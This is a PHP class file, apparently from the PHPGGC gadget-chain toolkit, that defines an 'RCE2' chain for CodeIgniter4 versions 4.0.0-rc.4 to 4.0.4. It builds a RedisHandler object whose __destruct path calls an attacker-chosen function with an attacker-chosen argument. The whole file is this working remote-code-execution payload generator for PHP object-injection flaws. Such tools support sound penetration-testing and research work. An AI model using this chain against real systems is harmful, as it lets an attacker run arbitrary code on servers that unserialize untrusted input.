<?php

namespace GadgetChain\CodeIgniter4;

class RCE2 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '4.0.0-rc.4 <= 4.0.4+'; // tested on 4.0.0-rc.4, 4.0.3 & 4.0.4
    public static $vector = '__destruct';
    public static $author = 'eboda';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \CodeIgniter\Cache\Handlers\RedisHandler($function, $parameter);
    }
}
